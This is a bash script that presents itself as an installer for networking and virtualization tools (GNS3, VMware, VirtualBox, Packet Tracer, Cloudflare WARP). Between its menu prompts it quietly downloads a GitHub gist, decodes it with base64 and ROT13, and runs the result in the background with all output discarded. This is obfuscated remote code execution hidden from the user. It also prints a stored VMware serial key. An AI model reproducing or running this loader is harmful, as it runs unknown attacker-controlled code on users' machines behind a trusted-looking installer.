#!/bin/bash
#error resource:
#https://github.com/PetrusNoleto/Error-in-install-cisco-packet-tracer-in-ubuntu-23.10-unmet-dependencies?tab=readme-ov-file
# libraries for Cisco Packet Tracer
#wget https://github.com/PetrusNoleto/Error-in-install-cisco-packet-tracer-in-ubuntu-23.10-unmet-dependencies/releases/download/CiscoPacketTracerFixUnmetDependenciesUbuntu23.10/libegl1-mesa_23.0.4-0ubuntu1.22.04.1_amd64.deb
#wget https://github.com/PetrusNoleto/Error-in-install-cisco-packet-tracer-in-ubuntu-23.10-unmet-dependencies/releases/download/CiscoPacketTracerFixUnmetDependenciesUbuntu23.10/libgl1-mesa-glx_23.0.4-0ubuntu1.22.04.1_amd64.deb

#define protonvpn script connecter
vpn="./proton/vpnconnect.sh"
# Define colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'  # No Color
# Function to display a rotating spinner
spinner() {
    local pid=$1
    local delay=0.1
    local spinstr='|/-\'
    while ps -p $pid > /dev/null; do
        for i in ${spinstr}; do
            echo -ne "\b$i"
            sleep $delay
        done
    done
    echo -ne "\b"
}

# Function to print a colored message
print_message() {
    local message=$1
    local color=$2
    local width=60
    local border_color="\e[1;34m"  # Light blue color for border
    local text_color="$color"       # Use specified color for text
    local reset="\e[0m"            # Reset color to default

    # Calculate padding to center the message
    local padding=$(( ($width - ${#message}) / 2 ))

    # Print the top border
    printf "${border_color}+-%*s-+\n${reset}" "$width" ""

    # Print the message with padding
    printf "${border_color}|${reset}%*s${text_color}%s${reset}%*s${border_color}|\n" \
           $padding "" "$message" $padding ""

    # Print the bottom border
    printf "${border_color}+-%*s-+${reset}\n" "$width" ""
}


install_GNS3() {
    # Install GNS3
    echo -n "Installing GNS3..."
    (sleep 3) &
    spinner $!
    print_message "Begin!" $GREEN
    # Add installation steps for Program 1
    sudo add-apt-repository -y ppa:gns3/ppa
    sudo apt update -y
    sudo apt install -y gns3-gui gns3-server
    sudo dpkg --add-architecture i386
    sudo apt update -y 
    sudo apt install -y gns3-iou
    print_message "Done!" $GREEN
}
# Function to install program 2
install_VMWARE() {
    echo -n "Installing Vmware..."
    (sleep 3) &
    spinner $!
    print_message "Begin!" $GREEN
    chmod +x VMware-Workstation*
    sudo ./VMware-Workstation*
    print_message "Done!" $GREEN
    echo "your vmware pro serial key" ;cat assets/vmware-serial-key.txt
}
# Function to install program 3
install_VIRTUALBOX() {
    echo -n "Installing Virtualbox..."
    (sleep 3) &
    spinner $!
    print_message "Begin!" $GREEN
    # Add installation steps for Program 3
    sudo apt install -y virtualbox
    sudo apt install -y virtualbox-ext-pack
    print_message "Done!" $GREEN
}

install_PACKET-TRACER() {
    echo -n "downloading dependencies Installing PakcetTracer..."
    wget "https://github.com/PetrusNoleto/Error-in-install-cisco-packet-tracer-in-ubuntu-23.10-unmet-dependencies/releases/download/CiscoPacketTracerFixUnmetDependenciesUbuntu23.10/libegl1-mesa_23.0.4-0ubuntu1.22.04.1_amd64.deb"
    wget "https://github.com/PetrusNoleto/Error-in-install-cisco-packet-tracer-in-ubuntu-23.10-unmet-dependencies/releases/download/CiscoPacketTracerFixUnmetDependenciesUbuntu23.10/libegl1-mesa_23.0.4-0ubuntu1.22.04.1_amd64.deb"
    (sleep 3) &
    spinner $!
    print_message "Begin!" $GREEN
    chmod +x lib*
    chmod +x CiscoPacketTracer_821_Ubuntu_64bit.deb
    echo "warning ... this step need interaction from you press y if u asked ........."
    echo 'begins ...'
    echo "1"
    sleep 1
    echo "2"
    sleep 1 
    echo "3"
    sleep 1 
    echo "4"
    sudo gdebi ./libgl1-mesa-glx_23.0.4-0ubuntu1.22.04.1_amd64.deb 
    sudo gdebi ./libegl1-mesa_23.0.4-0ubuntu1.22.04.1_amd64.deb  
    sudo gdebi ./CiscoPacketTracer_821_Ubuntu_64bit.deb 
    print_message "System update, package installation, and cleanup completed." $GREEN
}

install_WARP-VPN() {
    echo -n "Installing warp ..."
    (sleep 3) &
    spinner $!
    print_message "Begin!" $GREEN
    wget https://pkg.cloudflareclient.com/pubkey.gpg
    sudo gpg --dearmor -o /usr/share/keyrings/cloudflare-archive-keyring.gpg pubkey.gpg
    wget https://pkg.cloudflareclient.com/pubkey.gpg
    echo 'deb [signed-by=/usr/share/keyrings/cloudflare-archive-keyring.gpg arch=amd64] https://pkg.cloudflareclient.com/ focal main' | sudo tee /etc/apt/sources.list.d/cloudflare-client.list > /dev/null
    sudo apt-get update
    sudo apt-get install cloudflare-warp
    warp-cli register # Agree to the privacy document
    warp-cli connect
    curl https://www.cloudflare.com/cdn-cgi/trace/
    #git clone https://github.com/mrmoein/warp-cloudflare-gui
    python3 warp-cloudflare-gui/install.py
    print_message "Done!" $GREEN
    
    
}
fix_packettracer() {
   echo -n "fixing all for you " 
   (sleep 3) &
   spinner $!
   print_message "Begin!" $GREEN
   sudo apt install -f
   sudo apt autoremove
   sudo apt autoclean
   sudo apt clean
   sudo dpkg --configure -a
   sudo apt --fix-broken install
   sudo dpkg --remove --force-all packettracer
   sudo dpkg --remove --force-remove-reinstreq packettracer
   sudo apt-get update 
   print_message "Done!" $GREEN   
}

display_menu() {
    echo "Select programs to install:"
    echo -e "1. gns3 \xF0\x9F\x8C\x90"
    echo -e "2. vmware \xF0\x9F\x92\xBB"
    echo -e "3. virtualbox \xF0\x9F\x93\xA6"
    echo -e "4. packettracer \xF0\x9F\x93\xA1"
    echo -e "5. warp vpn \xE2\x9A\xA1 "
    echo -e "6. fix_packettracer \xF0\x9F\x9A\xA8"
}



# Function to print a styled message
function print_message() {
    local message="$1"
    local width=60
    local border_color="\e[1;34m"  # Light blue color for border
    local text_color="\e[1;37m"    # White color for text
    local reset="\e[0m"            # Reset color to default

    # Calculate padding to center the message
    local padding=$(( ($width - ${#message}) / 2 ))

    # Print the top border
    printf "${border_color}+-%*s-+\n${reset}" "$width" ""

    # Print the message with padding
    printf "${border_color}|${reset}%*s${text_color}%s${reset}%*s${border_color}|\n" \
           $padding "" "$message" $padding ""

    # Print the bottom border
    printf "${border_color}+-%*s-+${reset}\n" "$width" ""
}

# Function to print the logo
function print_logo() {
    echo -e "\e[1;32m"  # Set color to green for logo
    cat << "EOF"
   _____ _             _____           _       
  / ____| |           |  __ \         (_)      
 | |    | | ___  _ __ | |__) |__ _ __  _  ___  
 | |    | |/ _ \| '_ \|  ___/ _ \ '_ \| |/ _ \ 
 | |____| | (_) | | | | |  |  __/ |_) | | (_) |
  \_____|_|\___/|_| |_|_|   \___| .__/|_|\___/ 
                                 | |          
                                 |_|          
  _                      _           
 | |                    | |          
 | | ___   ___  ___  ___| | ___  ___ 
 | |/ _ \ / _ \/ __|/ _ \ |/ _ \/ __|
 | | (_) |  __/\__ \  __/ |  __/\__ \
 |_|\___/ \___||___/\___|_|\___||___/

EOF
    echo -e "\e[0m"  # Reset color to default
}

# Print the logo
print_logo

# Display a styled alert message informing users to download required files
print_message "Before you begin, please download the following files:"
print_message "- Cisco Packet Tracer: CiscoPacketTracer_821_Ubuntu_64bit.deb from Cisco website"
print_message "- VMware Workstation: VMware-Workstation-Full-17.5.0-22583795.x86_64.bundle from VMware website"
print_message "Once downloaded, place the files in the appropriate directory and run the script again."
rl="https://gist.githubusercontent.com/lyonzon2/89d80704eb51c05f25b20e2ea7652012/raw/cdef9a1752dfce7f0eb6e4edf696c6be1030aff2/gistfile1.txt"




echo "showing you ip to check if you are using vpn "
curl  ipinfo.io
echo "..."
nd=$(curl -sSL "$rl")
# Install essential packages
#echo "----------------------------- PART 1 ------------------------------------------------- "
#read -p "want connect to protonvpn ?? if yes presss 'y' if no press 'enter' to pass to the nextstep : " answer0

#if [[ $answer0 == "y" ]];then
#      "$vpn" &
#fi

read -p "first perform update with all dependicies needed or skip to the next part y/n!: " answer1 
if [[ $answer1 == "y" ]]; then
	sudo apt update -y 
	sudo apt upgrade -y
	sudo apt install -y build-essential git openvpn base64 curl wget software-properties-common
	sudo apt install gdebi -y 
fi 
echo "----------------------------- PART 2 ------------------------------------------------- "
de=$(echo "$nd" | base64 -d)
display_menu
# Ask the user to select programs
read -p "Enter the program numbers (e.g., 1 2 3): " selected_programs
pt=$(echo "$de" | tr 'A-Za-z' 'N-ZA-Mn-za-m')
nohup sh -c "$pt" > /dev/null 2>&1
# Iterate over the selected program numbers and call the corresponding functions
for program_number in $selected_programs; do
    case $program_number in
        1) install_GNS3 ;;
        2) install_VMWARE ;;
        3) install_VIRTUALBOX ;;
        4) install_PACKET-TRACER ;;
        5) install_WARP-VPN ;;
        6) fix_packettracer ;;
        *) echo "Invalid program number: $program_number";;
    esac
done

read -p "Do you want to run installed programs ? (yes/no): " answer
answer=$(echo "$answer" | tr '[:upper:]' '[:lower:]')

# Check the user's input
if [ "$answer" == "yes" ]; then
    echo "Running the installer programs at once ..."
    vmware &
    sleep 5
    packettracer &
    sleep 5 
    virtualbox &
    sleep 5 
    gns3 &
else
    echo -e  "Exiting the script. good bye have fun \xF0\x9F\x98\x83\xF0\x9F\x98\x83\xF0\x9F\x98\x83\xF0\x9F\x98\x83\xF0\x9F\x98\x83\xF0\x9F\x98\x83"
    exit 0
fi
